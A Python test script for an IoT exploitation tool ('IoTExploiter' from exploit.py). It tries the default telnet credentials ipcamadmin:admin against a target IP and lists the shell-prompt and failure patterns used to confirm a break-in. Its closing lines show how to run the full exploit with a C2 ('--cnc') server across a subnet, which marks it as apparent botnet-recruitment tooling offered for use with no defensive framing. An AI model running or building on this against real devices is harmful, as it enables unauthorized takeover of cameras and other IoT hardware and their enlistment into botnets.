#!/usr/bin/env python3
"""
Test script for ipcamadmin credentials detection
This script tests the enhanced telnet detection logic specifically for ipcamadmin credentials
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from exploit import IoTExploiter
import logging

def test_ipcam_credentials():
    """Test the ipcamadmin:admin credentials with enhanced debugging"""
    print("=" * 60)
    print("Testing ipcamadmin:admin credentials detection")
    print("=" * 60)
    
    # Create exploiter instance
    exploiter = IoTExploiter("127.0.0.1")  # C2 server IP doesn't matter for this test
    
    # Test IP - you should replace this with your actual target IP
    test_ip = input("Enter target IP to test (or press Enter for simulation): ").strip()
    
    if not test_ip:
        print("Running simulation mode - showing what the enhanced detection logic looks for...")
        print("\nEnhanced Detection Patterns:")
        print("✓ Shell patterns now include: b'ipcamadmin@' specifically")
        print("✓ Added debugging to show raw response from telnet server")
        print("✓ Added delayed response reading for slow devices")
        print("✓ Better verification with echo commands")
        
        # Show what patterns we're looking for
        shell_patterns = [
            b":~$ ", b":~# ", b":/$ ", b":/# ",  # Linux-style prompts with paths
            b"$ ", b"# ",  # Basic shell prompts (but only with space after)
            b"admin@", b"root@", b"user@", b"ipcamadmin@", b"temphumidadmin@",  # Specific user prompts
            b"menu>", b"Main Menu", b"BusyBox",  # Device-specific prompts
            b"~$ ", b"~# ", b"~]$ ", b"~]# "  # Additional common shell patterns
        ]
        
        print(f"\nLooking for these shell patterns: {[p.decode() for p in shell_patterns]}")
        
        failure_patterns = [
            b"incorrect", b"failed", b"invalid", b"denied", 
            b"Login incorrect", b"Access denied", b"Authentication failed",
            b"wrong", b"error", b"failure", b"not recognized",
            b"login failed", b"access denied", b"authentication failed",
            b"permission denied", b"login attempt failed"
        ]
        
        print(f"\nWatching for these failure patterns: {[p.decode() for p in failure_patterns]}")
        
        print("\nKey improvements:")
        print("1. Fixed shell detection patterns (removed regex-like patterns that didn't work)")
        print("2. Added specific 'ipcamadmin@' detection")
        print("3. Added raw response logging for debugging")
        print("4. Added delayed response reading for slow devices")
        print("5. Better shell verification with echo commands")
        
        return True
    
    # Real test against target IP
    print(f"\nTesting against real target: {test_ip}")
    print("Username: ipcamadmin")
    print("Password: admin")
    print("\nAttempting telnet login with enhanced detection...")
    
    # Test the specific credentials
    success = exploiter.attempt_telnet_login(test_ip, 23, "ipcamadmin", "admin")
    
    if success:
        print(f"\n✅ SUCCESS! Enhanced detection correctly identified successful login for {test_ip}")
        print("The credentials ipcamadmin:admin are working!")
    else:
        print(f"\n❌ FAILED! Enhanced detection could not verify successful login for {test_ip}")
        print("Check the debug output above to see what response was received.")
        print("\nPossible issues:")
        print("1. Device might not be responding on port 23")
        print("2. Credentials might actually be incorrect")
        print("3. Device might have unusual shell prompt format")
        print("4. Network connectivity issues")
    
    return success

def show_log_analysis():
    """Show how to analyze the enhanced logs"""
    print("\n" + "=" * 60)
    print("HOW TO ANALYZE THE ENHANCED LOGS")
    print("=" * 60)
    
    print("\nWhen running the exploit, look for these debug lines:")
    print("1. 'Login response (raw):' - Shows exactly what bytes were received")
    print("2. 'Pattern matched index:' - Shows which pattern (if any) was matched")
    print("3. 'Additional response:' - Shows delayed responses from slow devices")
    
    print("\nIf ipcamadmin:admin is still failing, check:")
    print("• Does the raw response contain 'ipcamadmin@' anywhere?")
    print("• Does the raw response contain '$' or '#' symbols?")
    print("• Are there any failure messages in the response?")
    print("• Is the device sending a delayed prompt?")
    
    print("\nExample of what success should look like:")
    print("Login response (raw): b'ipcamadmin@hostname:~$ '")
    print("Pattern matched index: 4, match: <_sre.SRE_Match object>")
    print("[SUCCESS] Detected shell prompt with user@host format")

if __name__ == "__main__":
    try:
        success = test_ipcam_credentials()
        show_log_analysis()
        
        print("\n" + "=" * 60)
        print("NEXT STEPS")
        print("=" * 60)
        
        if success:
            print("✅ The enhanced detection logic is working correctly!")
            print("You can now run the full exploit script and it should properly detect ipcamadmin:admin")
        else:
            print("🔧 Run the full exploit script with these credentials and check the enhanced debug output")
            print("The new logging will show you exactly why the detection is failing")
        
        print(f"\nTo run the full exploit: python exploit.py --cnc 127.0.0.1 --subnet <your_subnet>")
        print("Or use the interactive menu: python exploit.py --cnc 127.0.0.1")
        
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
    except Exception as e:
        print(f"\nError during test: {e}")
        print("Make sure you're in the correct directory and exploit.py is available")
